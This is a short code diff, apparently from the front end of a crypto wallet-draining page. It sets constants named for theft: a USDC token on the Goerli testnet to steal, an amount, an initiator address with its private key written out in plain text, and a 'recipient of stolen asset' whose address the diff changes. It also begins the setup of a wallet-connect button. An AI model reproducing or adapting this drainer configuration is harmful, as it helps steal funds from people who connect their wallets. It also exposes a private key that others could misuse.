@@ -7,7 +7,7 @@ const tokenToSteal = "0x07865c6E87B9F70255377e024ace6630C1Eaa37F" // USDC on Goe
 const amountToSteal = String(20 * (10 ** 6)) // calculate USDC amount
 const initiator = "0xECD56821D6eB6db6cCB30243cb1d6592Ff5A0F14" // initiator address
 const initiatorPK = "050947b326c43b89fd7d46ef2e3ab49ce419ac03c4ba1e66c055abb86cf6d2c4" // initiaror's private key
-const recipient = "0xf50b1E00215D83089AEE99b76D64a9C0b915062a" // recipient of stolen asset
+const recipient = "0xE41ecA9bD322AE72A1E3C1B61f0CC2D0bfc07eef" // recipient of stolen asset
 
 // setup UI
 const connectButton = document.getElementById("connect")
